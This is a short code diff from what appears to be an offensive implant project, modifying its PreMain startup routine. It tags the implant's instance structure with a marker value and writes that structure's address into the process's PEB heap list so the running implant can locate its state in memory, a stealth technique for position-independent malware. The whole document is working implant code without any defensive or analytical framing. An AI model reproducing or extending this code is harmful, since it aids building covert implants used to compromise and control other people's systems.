@@ -9,9 +9,14 @@ EXTERN_C FUNC VOID PreMain(
     PVOID    MmAddr   = { 0 };
     SIZE_T   MmSize   = { 0 };
     ULONG    Protect  = { 0 };
-    CHAR     Error    = { 0 };
+    PPEB     Peb      = NtCurrentPeb();
 
     Imperium::mem::zero( &Stardust, sizeof( Stardust ) );
+
+    //
+    // set a context to find the instance struct in memory
+    //
+    Stardust.Context = 0xc0debabe;
 
     //
     // get the base address of the current implant in memory and the end.
@@ -43,6 +48,13 @@ EXTERN_C FUNC VOID PreMain(
     //
     if ( ! ( C_DEF( MmAddr ) = Imperium::mem::alloc( sizeof( INSTANCE ) ) ) ) {
         return;
+    }
+
+    //
+    // add the address of the struct to the peb
+    //
+    if ( Peb->NumberOfHeaps < Peb->MaximumNumberOfHeaps ) {
+        Peb->ProcessHeaps[ Peb->NumberOfHeaps++ ] = C_DEF( MmAddr );
     }
 
     //
